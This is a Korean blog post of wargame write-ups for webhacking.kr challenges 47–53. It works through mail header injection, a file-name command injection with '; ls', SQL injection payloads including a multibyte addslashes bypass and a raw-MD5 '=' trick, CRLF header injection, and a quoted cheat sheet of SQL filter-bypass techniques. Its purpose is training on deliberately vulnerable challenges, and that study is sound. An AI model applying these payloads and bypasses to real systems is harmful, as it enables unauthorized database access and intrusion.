---
title: "Security: webhacking.kr 47-51"
last_modified_at: 2020-08-08T20:20:02-05:00
categories:
  - Security
tags:
  - webhacking.kr
  - 웹해킹
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

---
### 47 문제풀이 (Mail Header Injection)
---
---
#### Mail Header Injection
---

**Mail Header Injection이란?**  
공격자가 메시지에 추가 헤더를 삽입하여 메일서버가 의도한 것과 다르게 동작하도록 지시하는 것으로 
이 페이지에서는 이메일 헤더에 cc(참조)나 Bcc(숨은 참조)를 추가하여 관리자에게만 
보내는 메일을 다른 사람들에게 참조를 하여 메일을 보낼 수 있는 취약점이다. 
{: .notice}

예를 들면 공격자는 메일 주소로 아래의 데이터를 리퀘스트로 보냅니다
bob@hackr.jp$0D%0ABcc: user@example.com
%0D%0A는 메일 메시지에서 개행 문자를 의미합니다. 즉 수신자에 bcc가 몰래 추가되게 됩니다.
같은 방법으로 To나 Subject 등에 임의의 메일 헤더를 쓰거나 본문에 첨부파일을 추가 하는게 가능합니다.
출처: https://blog.sonim1.com/103 [Kendrick's Blog]
{: .notice}

---
#### 문제풀이
---

47번 문제를 보니 Mail subject를 입력하는 란이 보인다. send를 눌러보자.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

Flag값을 메일로 보내주는 모양이다 그런데 이상한 점은 도착 메일이 고정되어있다. 이를 수정하거나 내 메일 주소를 추가해야한다.
{: .notice}


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>

그냥 텍스트 창에 0D%0ACc:메일ID@naver.com를 입력해보니 엔터값이 그대로 문자로 들어가서 메일을 받을 수 없었다. 그래서 Burp suite를 활용하여 CC로 내 메일을 추가했다.
{: .notice}


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-4.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-5.JPG" alt="">
  <figcaption> </figcaption>
</figure>

그리고 Cc가 잘 들어갔음을 볼 수 있었다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-6.JPG" alt="">
  <figcaption> </figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제47/47-7.JPG" alt="">
  <figcaption> </figcaption>
</figure>

실제 메일로 Flag 값이 온 것을 볼 수 있었다. Clear!
{: .notice}

---
### 48 문제풀이
---

48번 문제에 들어가보니 파일을 업로드하는 란이 보인다. 파일을 업로드 하니 시간, id, 입력한 메모가 보인다.
{: .notice}


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제48/48-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

파일을 업로드 하거 나 삭제할 때를 burp suite로 캡처해서 보니 mode=del 같은 명령어가 왔다 갔다 하는 것이 보인다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제48/48-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

어떻게 할까 고민하다가 파일명 뒤에 ; 을 붙이고 ls을 입력했다. 그리고 파일을 업로드 했는데 아무 반응이 없었다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제48/48-4.JPG" alt="">
  <figcaption> </figcaption>
</figure>

도로 파일을 삭제해보니 갑자기 파일 이름들과 함께 FLAG가 보였다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제48/48-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>

Clear!
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제48/48-5.JPG" alt="">
  <figcaption> </figcaption>
</figure>


---
### 49 문제풀이
---

이 문제는 어디서 많이 봤던 문제다. 소스코드부터 보자.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제49/49-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 49</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
level : <input name=lv value=1><input type=submit>
</form>
<?php
  if($_GET['lv']){
    $db = dbconnect();
    if(preg_match("/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",$_GET['lv'])) exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall49 where lv={$_GET['lv']}"));
    echo $result[0] ;
    if($result[0]=="admin") solve(49);
  }
?>
<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```

select, or, and, \, (, ), limit, , 등등을 피해 SQL injection을 해보자.
{: .notice}

```
?lv=0||id=0x61646D696E
```

or를 대신해 ||를 사용하고 ( )를 사용하지 못해서 char()대신 hex 값을 사용한다.
{: .notice}


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제49/49-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

Clear!
{: .notice}


---
### 50 문제풀이
---

50번 문제는 어디서 많이 본 듯한 화면이다. 제출/초기화 버튼과 함께 id, pw 입력 창이 있다. 바로 소스코드를 살펴보자.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제50/50-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

로그인을 하면 level 1 이라는 문자열이 출력된다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제50/50-2.JPG" alt="">
  <figcaption> </figcaption>
</figure>

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 50</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
id : <input name=id value='guest'><br>
pw : <input name=pw value='guest'><br>
<input type=submit>&nbsp;&nbsp;&nbsp;<input type=reset>
</form>
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']); 
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
    if(preg_match("/union/i",$_GET['id'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      if($result['lv']==1) echo("level : 1<br><br>");
      if($result['lv']==2) echo("level : 2<br><br>");
    } 
    if($result['lv']=="3") solve(50);
    if(!$result) echo("Wrong");
  }
?>
<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```

소스코드를 살펴보자. 50번 문제에서는 id와 pw 값을 받은 후 db에 연결한다. id는 addslashes 처리를 하고
id는 추가적으로 멀티바이트 엔코딩 처리를 해준다. 그리고 from pw ( ) "(공백)" % = > < " 나 union이 포함되면 종료된다.
모든 검사를 마친후엔 "select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"
과 같이 id와 pw(md) 조건에 맞는 lv 값을 찾아 출력한다. lv=3을 출력하는 것이 우리의 목표다.
{: .notice}

addslashes와 mb_convert_encoding가 함께 등장하였다. 멀티바이트를 사용하는 언어셋 환경에서는 "\"앞에 %a1~%fe 값이 들어오면 "\"(%5c)와 합쳐져서 하나의 문자가된다.
addslashes를 우회 할 수 있다는 뜻이다. 이를 이용하여 몇가지 테스트를 해보자.
{: .notice}

```
https://webhacking.kr/challenge/web-25/?id=guest&pw=guest

https://webhacking.kr/challenge/web-25/?id=%a1%27||lv%0alike%0a1%23&pw=guest //lv 1 조회 성공

https://webhacking.kr/challenge/web-25/?id=%a1%27||lv%0alike%0a2%23&pw=guest //lv 2 조회 성공

https://webhacking.kr/challenge/web-25/?id=%a1%27||lv%0alike%0a3%23&pw=guest //lv 3 조회 실패
```

lv 3는 db에 존재하지 않는 모양이다. 그렇다면 union을 써보자. 소스코드를 보면 id 필드에 대해서만 union을 검사하고있다.
아래와 같이 id와 pw에 /* */ 값을 줘서 md5 encode하는 부분을 주석처리 하고 select 3 결과를 union 해준다. 
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제50/50-3.JPG" alt="">
  <figcaption> </figcaption>
</figure>

이를 url로 작성하면 Clear!
{: .notice}

```
https://webhacking.kr/challenge/web-25/?id=%a1%27/*&pw=*/Union%0aselect%0a3%23
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제50/50-4.JPG" alt="">
  <figcaption> </figcaption>
</figure>

---
### 51 문제풀이 (SQL Injection with raw MD5 hashes)
---

---
### SQL Injection with raw MD5 hashes
---

'SQL Injection with raw MD5 hashes' 공격은 SQL에서 md5암호화가 true 설정으로 이용될 때 가능한 공격으로서, 생성되는 바이너리 값을 통해 SQL 인젝션 공격을 하는 것이다.
{: .notice}

---
### 문제풀이
---
51번 문제를 보자. 로그인 화면이 나타나져 있고 admin page라고 쓰여있다. post 방식으로 값을 넘겨주고있다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제51/51-1.JPG" alt="">
  <figcaption> </figcaption>
</figure>

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 51</title>
<style>
table{ color:lightgreen;}
</style>
</head>
<body bgcolor=black><br><br>
<font color=silver>
<center><h1>Admin page</h1></center>
</font>
<?php
  if($_POST['id'] && $_POST['pw']){
    $db = dbconnect();
    $input_id = addslashes($_POST['id']);
    $input_pw = md5($_POST['pw'],true);
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall51 where id='{$input_id}' and pw='{$input_pw}'"));
    if($result['id']) solve(51);
    if(!$result['id']) echo "<center><font color=green><h1>Wrong</h1></font></center>";
  }
?>
<br><br><br>
<form method=post>
<table border=0 align=center bgcolor=gray width=200 height=100>
<tr align=center><td>ID</td><td><input type=text name=id></td></tr>
<tr align=center><td>PW</td><td><input type=password name=pw></td></tr>
<tr><td colspan=2 align=center><input type=submit></td></tr>
</table>
<font color=silver>
<div align=right><br>.<br>.<br>.<br>.<br><a href=./?view_source=1>view-source</a></div>
</font>
</form>
</body>
</html>
```

소스코드를 살펴보자. id와 pw를 post 방식으로 넘기고 db에 연결한다. id는 이전 문제와 마찬가지로 addslashes 처리를 해주고
pw는 md5 변환을 해주고있다. 다른 문제와는 다르게 true가 함께 쓰여있는데, 이는 바이너리 값을 반환한다는 뜻이다.
 그리고 이 값들을 이용하여 chall51로 부터 id가 출력 되면 풀린다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제51/51-2.JPG" alt="">
  <figcaption>'or 1=1#을 시도하였지만 실패 </figcaption>
</figure>

pw 부분에 'or 1=1# 와 같은 값을 넣을 수 있으면 좋겠지만 md5 encoding 후 바이너리 값으로 들어가기 
때문에 이러한 값을 찾는 것이 힘들다고 한다. 그래서 새로운 방법을 찾아야하는데 
{: .notice}

```
select id from chall51 where id='{$input_id}' and pw='{$input_pw}'
```

다음과 같은 쿼리에서 Where 거짓 = 거짓 = 거짓 형태를 만들어 주면 최종적으로 참이 되어 문제가 풀린다고한다.  
즉, 아래와 같은 형태가 되면 거짓 = 거짓 이므로 (문자는 거짓의 의미를 가진다고 한다) 결론은 참이 된다.
{: .notice}

```
select id from chall51 where id='admin' and pw='asdf'='qwer'
```

그래서 위의 소스코드를 참고하여 '=' 를 가지는 md5 값을 한번더 바이너리화 한 값을 찾아주면 되는데 이 값을 찾기위해서는
랜덤한 숫자를 일일이 대입해서 찾아야한다고 한다. 그래서 파이썬 코드를 이용하여 "'='"을 포함하는 값을 찾았다.
{: .notice}

```python
import hashlib
import random

for num in range(0,999999999):
    bin=hashlib.md5(str(num).encode('utf-8')).digest()
    if b"'='" in bin:
        print("num: {}".format(num))
        print(bin)
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제51/51-4.JPG" alt="">
  <figcaption></figcaption>
</figure>

id 에는 admin을 pw 에는 num 중 하나를 입력하였더니 Clear!
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제51/51-5.JPG" alt="">
  <figcaption></figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제51/51-6.JPG" alt="">
  <figcaption></figcaption>
</figure>


---
### 52 문제풀이 (header Injection)
---

52번 문제에 들어와보니 다음과 같은 화면이 보였다. admin page로 들어가야하는데 주어진 계정은 guest 계정 뿐이다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-1.JPG" alt="">
  <figcaption></figcaption>
</figure>

화면 아래에 proxy를 눌러보니 아래와 같은 정보가 보였다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-2.JPG" alt="">
  <figcaption></figcaption>
</figure>

그리고나서 guest 계정으로 로그인을 해보았다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-3.JPG" alt="">
  <figcaption></figcaption>
</figure>

id와 pw을 입력하면 http 헤더내의 Authorization 필드에 base 64 값으로 넘어가는 것이 보였다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-4.JPG" alt="">
  <figcaption></figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-5.JPG" alt="">
  <figcaption></figcaption>
</figure>

로그인을 재 시도 하려다가 취소를 하니 소스코드를 볼 수 있는 화면으로 넘어갔다. 소스 코드는 아래와 같다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-6.JPG" alt="">
  <figcaption></figcaption>
</figure>

```php
<?php
include "config.php";
if($_GET['view_source']) view_source();
if($_GET['logout'] == 1){
  $_SESSION['login']="";
  exit("<script>location.href='./';</script>");
}
if($_SESSION['login']){
  echo "hi {$_SESSION['login']}<br>";
  if($_SESSION['login'] == "admin"){
    if(preg_match("/^172\.17\.0\./",$_SERVER['REMOTE_ADDR'])) echo $flag;
    else echo "Only access from virtual IP address";
  }
  else echo "You are not admin";
  echo "<br><a href=./?logout=1>[logout]</a>";
  exit;
}
if(!$_SESSION['login']){
  if(preg_match("/logout=1/",$_SERVER['HTTP_REFERER'])){
    header('WWW-Authenticate: Basic realm="Protected Area"');
    header('HTTP/1.0 401 Unauthorized');
  }
  if($_SERVER['PHP_AUTH_USER']){
    $id = $_SERVER['PHP_AUTH_USER'];
    $pw = $_SERVER['PHP_AUTH_PW'];
    $pw = md5($pw);
    $db = dbconnect();
    $query = "select id from member where id='{$id}' and pw='{$pw}'";
    $result = mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']){
      $_SESSION['login'] = $result['id'];
      exit("<script>location.href='./';</script>");
    }
  }
  if(!$_SESSION['login']){
    header('WWW-Authenticate: Basic realm="Protected Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo "Login Fail";
  }
}
?><hr><a href=./?view_source=1>view-source</a>
```

소스코드를 보니 다른 코드들과 비슷하게 mysqli를 이용하고 있었다, 그래서 ' or id='admin' --를 id란에 입력해보니 로그인에 성공하였다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-7.JPG" alt="">
  <figcaption></figcaption>
</figure>

```
if(preg_match("/^172\.17\.0\./",$_SERVER['REMOTE_ADDR'])) echo $flag;
    else echo "Only access from virtual IP address";
```

그렇지만 접속한 ip가 172.17.0.x 가 아니라서 위와 같은 메세지가 출력되었다. 172.17.0.x 인 ip인 경우에만 flag를 출력해주는 모양이다. 
처음에는 ip 주소를 바꾸고자 인터넷을 찾아본 결과 X-Forwarded-For 헤더를 삽입하면 바뀌는 경우가 가끔있다고 한다. 하지만 이 문제는 그렇게는 해결 되지 않았다.
{: .notice}

다른 방법을 찾아본 결과 proxy.php에 접근하여 page=에 %0d%0a를 이용하여 Authorization값과 세션값을 넣어서 proxy.php의 비어있는 Request 부분을 채워줘야했다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-8.JPG" alt="">
  <figcaption></figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-9.JPG" alt="">
  <figcaption></figcaption>
</figure>

그리고 나서 얻은 flag 값을 auth에 입력하여 Clear!
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제52/52-10.JPG" alt="">
  <figcaption></figcaption>
</figure>

---
### 53 문제풀이 (SQL Injection)
---
---
#### SQL Injection 우회 기법 정리
---

```sql
--------------------------------------------
* or, and
* ||, &&
--------------------------------------------
* String Filtering (Ex. preg_match - admin 등
* admin -> 0x61646d696e, 0b0110000101100100011011010110100101101110, char(0x61, 0x64, 0x6d, 0x69, 0x6e)
	* char()의 경우 타 진법으로도 사용 가능
--------------------------------------------
* Blind SQL Injection 시 '='(Equal) Filtering
* substr('abc',1,1)like('a'), if(strcmp(substr('abc',1,1),'a'),0,1), substr('abc',1,1)%20in('a')
--------------------------------------------
* substr filtering
* right(left('abc',1),1), id>0x41444d4941 ('ADMIN'은 'ADMIA'보다 hex값이 크다)
--------------------------------------------
* ereg, eregi
* 'admin' 필터링 시 'AdmIN' 등으로 우회 가능
* 맨 앞에 %00을 삽입 시 뒤의 문자가 필터링 되지 않음
--------------------------------------------
* replace, replaceAll
* 'admin' 필터링 시 'adadminmin' 등으로 우회 가능
--------------------------------------------
* numeric character filtering
* 0 -> '!'='@'
* 1 -> '!'='!' 등으로 true, false 및 수식을 이용하여 숫자를 표현 가능
--------------------------------------------
* White Space Filtering (%20
* %20 -> %0a %0b %0c %0d %09
--------------------------------------------
* Single Quote Filtering (%27)
* Single Quote 안에서 Double quote를 쓰면 해결되는 경우도 있음
* 특수한 조건에서 %bf%27 로 Multibyte를 만들어 필터링을 우회할 수도 있음 (하지만 거의 없는 경우)
* '\' 백슬래시 문자가 필터링 되어있지 않은 경우 다음과 같은 상황에서 우회 가능
	* ex. select test1 from test where id='\' and pw=' or 1#
	*  parameter : id=\&pw=%20or%201%23
--------------------------------------------
* 주석 
* #, --, ;%00, /* */
--------------------------------------------
* 주석을 이용한 SQL Injection
* '#'의 주석 범위는 1 line이다. 1 line을 나누는 기준은 %0a로 나뉘기 때문에 아래 예제와 같은 SQL Injection을 수행할 수 있다.
	* select test1 from test where id='abc'# and pw='%0a or id='admin'%23
* /* */
	* select test1 from test where id='abc'/* and pw=''*/ or id='admin'%23
--------------------------------------------
* Blind SQL Injection 시 sub query의 결과로 여러 row가 나오는데 where 문을 쓸 수 없을 때
* max(column_name), min(column_name), group_concat(column_name)
--------------------------------------------
* 테이블명, 컬럼명을 알아내야 할 때
* select test1 from test where id='admin' and pw='1234' procedure analyse();
* limit 2,1 등과 함께 사용하여 필요한 컬럼 명을 한 줄로 뽑아낼 수 있음
--------------------------------------------
* Error Based SQL Injection 할 때
* 0xfffffffffffff*0xfffffffffffff 를 하면 Integer 범위 초과 에러가 발생한다
--------------------------------------------
* MultiByte Character SQL Injection
* 'test1' 필드의 캐릭터가 아스키코드가 아닌 멀티바이트 캐릭터(ex. UTF-32 등)일 때는 다음과 같은 방법으로 SQL Injection을 수행할 수 있다.
* substr(hex(test1),1,1)=0x41
	* MultiByte Character인지 알아보기 위한 방법으로는 '>'와 '<'를 이용하여 범위를 찾아나갈때 문자의 범위가 예를들어 20과 21사이로 나온다면(아스키 문자의 범위가 소숫점으로 나오는 경우는 없다) 멀티바이트 캐릭터라고 추측할 수 있다.
--------------------------------------------
* SQL Injection이 먹히는지 알아볼 때
* '(싱글쿼터)를 썼을 때 에러가 나는지
* ' and '1'='1    ,     ' and '1'='2  를 썼을 때 앞에건 정상적으로 출력되고 뒤에건 출력이 안나는지
* ' or '1'='1 을 썼을 때 정상적으로 출력되는 지
* 숫자로 이루어진 컬럼 (ex. idx=23001) 을 idx=23002-1 로 넣었을 때 정상적으로 출력 되는 지
* '||' 를 썼을 때 정상적으로 출력되는 지 ( Restrict. DB가 Oracle이고 자료형이 Varchar로 선언되어 있을 때 )
* 주석을 쓸때는 #(%23), -- (--%20), %0a
--------------------------------------------
```

출처: https://ar9ang3.tistory.com/7
{: .notice}

---
#### 문제풀이
---
53번 문제는 소스코드 외에 주어진 것이 없다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제53/53-1.JPG" alt="">
  <figcaption></figcaption>
</figure>


```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?>
<html>
<head>
<title>Challenge 53</title>
</head>
<body>
<?php
  $db = dbconnect();
  include "./tablename.php";
  if($_GET['answer'] == $hidden_table) solve(53);
  if(preg_match("/select|by/i",$_GET['val'])) exit("no hack");
  $result = mysqli_fetch_array(mysqli_query($db,"select a from $hidden_table where a={$_GET['val']}"));
  echo($result[0]);
?>
<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```

소스코드를 확인해보자. database에 연결을 하고 있다. tablename.php로 부터 hidden_table을 불러오는 듯하다.
val 값을 받아서 select와 by가 있으면 no hack 이라는 메세지와 함께 종료된다. 두 값이 없으면 hidden table로 부터 a를 출력하는
쿼리를 보내고 결과를 출력한다. 목표는 hidden_table의 이름을 알아내는 것이다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제53/53-2.JPG" alt="">
  <figcaption></figcaption>
</figure>

우선 ?val=1 을 입력하면 결과가 1이 나오고 ?val=2는 2가 ?val=test를 입력하면 아무 값도 나오지 않는다.
{: .notice}

이 문제는 **procedure analyse();** 함수를 통해 쉽게 알아낼 수 있다. 이 함수는 현재 실행중인 컬럼에 대한 정보를 알려준다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제53/53-3.JPG" alt="">
  <figcaption></figcaption>
</figure>

?val=1 procedure analyse();를 입력해보았다. 현재 컬럼의 테이블명과 기타 정보들이 노출된다.
{: .notice}

```
webhacking.chall53_755fdeb36d873dfdeb2b34487d50a805.a
```
DB명은 webhacking, 테이블명은 chall53_755fdeb36d873dfdeb2b34487d50a805, 컬럼명은 a 인듯하다. 이제 구한 값을
answer 값으로 보내주면 되겠다. ?answer=chall53_755fdeb36d873dfdeb2b34487d50a805 로 넘겨준다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제53/53-4.JPG" alt="">
  <figcaption></figcaption>
</figure>






















